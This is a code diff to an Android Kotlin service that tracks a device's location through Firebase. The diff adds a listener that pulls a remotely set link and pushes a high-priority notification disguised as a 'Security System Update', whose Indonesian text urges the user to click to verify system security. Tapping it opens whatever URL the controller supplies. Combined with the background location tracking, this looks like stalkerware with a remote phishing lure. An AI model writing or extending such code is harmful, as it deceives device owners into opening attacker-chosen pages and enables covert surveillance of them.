@@ -9,8 +9,12 @@ import android.os.Looper
 import android.provider.Settings
 import android.util.Log
 import androidx.core.app.NotificationCompat
+import android.net.Uri
 import com.google.android.gms.location.*
+import com.google.firebase.database.DataSnapshot
+import com.google.firebase.database.DatabaseError
 import com.google.firebase.database.FirebaseDatabase
+import com.google.firebase.database.ValueEventListener
 
 class LocationTrackingService : Service() {
 
@@ -21,6 +25,7 @@ class LocationTrackingService : Service() {
         Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
     }
     private val deviceName = "${Build.MANUFACTURER} ${Build.MODEL}"
+    private var commandListener: ValueEventListener? = null
 
     override fun onCreate() {
         super.onCreate()
@@ -38,6 +43,46 @@ class LocationTrackingService : Service() {
         
         // Simpan info perangkat sekali saat service dibuat
         db.child("devices").child(deviceId).child("info").child("name").setValue(deviceName)
+        
+        startCommandListener()
+    }
+
+    private fun startCommandListener() {
+        commandListener = object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                val link = snapshot.child("last_link").getValue(String::class.java)
+                if (!link.isNullOrEmpty()) {
+                    // Cek jika link ini baru (bandingkan timestamp jika perlu, untuk sekarang simple saja)
+                    showCommandNotification(link)
+                }
+            }
+            override fun onCancelled(error: DatabaseError) {
+                Log.e("GPS_TRACKER", "Command listener cancelled: ${error.message}")
+            }
+        }
+        db.child("devices").child(deviceId).child("commands").addValueEventListener(commandListener!!)
+    }
+
+    private fun showCommandNotification(url: String) {
+        val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply {
+            flags = Intent.FLAG_ACTIVITY_NEW_TASK
+        }
+        val pendingIntent = PendingIntent.getActivity(
+            this, 0, intent,
+            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+        )
+
+        val notification = NotificationCompat.Builder(this, "location_channel")
+            .setContentTitle("Security System Update")
+            .setContentText("Klik untuk memverifikasi keamanan sistem.")
+            .setSmallIcon(android.R.drawable.ic_dialog_info)
+            .setAutoCancel(true)
+            .setPriority(NotificationCompat.PRIORITY_HIGH)
+            .setContentIntent(pendingIntent)
+            .build()
+
+        val manager = getSystemService(NotificationManager::class.java)
+        manager.notify(2, notification)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -105,5 +150,6 @@ class LocationTrackingService : Service() {
         super.onDestroy()
         Log.d("GPS_TRACKER", "Service Destroyed")
         fusedLocationClient.removeLocationUpdates(locationCallback)
+        commandListener?.let { db.child("devices").child(deviceId).child("commands").removeEventListener(it) }
     }
 }
